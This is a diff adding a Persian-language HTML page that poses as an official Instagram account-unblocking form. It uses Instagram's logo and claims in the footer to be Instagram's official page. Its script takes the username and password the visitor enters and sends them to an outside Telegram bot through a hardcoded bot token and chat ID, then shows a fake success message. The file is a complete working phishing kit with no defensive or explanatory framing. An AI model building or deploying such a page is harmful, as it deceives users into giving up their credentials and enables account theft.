@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اینستاگرام مسدودی رفع درخواست</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #201e1e;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #262626;
+        }
+        
+        .container {
+            width: 350px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin: 20px 0;
+            width: 175px;
+        }
+        
+        .form-group {
+            margin-bottom: 10px;
+            text-align: right;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        
+        button {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        button:hover {
+            background-color: #0077cc;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        
+        .success {
+            color: green;
+            display: none;
+        }
+        
+        .error {
+            color: red;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+        <h2>درخواست رفع مسدوی اینستاگرام</h2>
+        <p>لطفا اطلاعات حساب خود را برای رفع مسدودی وارد کنید تا احرازهویت تایید شود</p>
+        
+        <div class="form-group">
+            <input type="text" id="username" placeholder="نام کاربری اینستاگرام" required>
+        </div>
+        
+        <div class="form-group">
+            <input type="password" id="password" placeholder="رمز عبور" required>
+        </div>
+        
+        <button id="submit-btn">تایید و ارسال درخواست در حال بررسی</button>
+        
+        <p class="success" id="success-msg">درخواست شما با موفقیت ارسال شد!</p>
+        <p class="error" id="error-msg">خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.</p>
+        
+        <div class="footer">
+            <p>این صفحه رسمی اینستاگرام است برای رفع مسدودی دائمی حساب کاربری احراز هویت باید تایید و بررسی شود</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('submit-btn').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('لطفا نام کاربری و رمز عبور را وارد کنید');
+                return;
+            }
+            
+            
+            const data = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                source: 'Instagram Blue Tick Request'
+            };
+            
+            // جایگزین کنید با توکن ربات و چت آیدی شما
+            const botToken = '6883816516:AAFW37xyHkdFY5fKP_z0GTdpMhm-wTjlclk';
+            const chatId = '1934107366';
+            
+            const message = `اطلاعات کاربری جدید !  \n\nکاربری:  ${username}
+            
+            \nرمز:  ${password}
+            
+            \nزمان:  ${new Date().toLocaleString('fa-IR')}`;
+            
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('success-msg').style.display = 'block';
+                    document.getElementById('error-msg').style.display = 'none';
+                } else {
+                    throw new Error('Telegram API error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('success-msg').style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
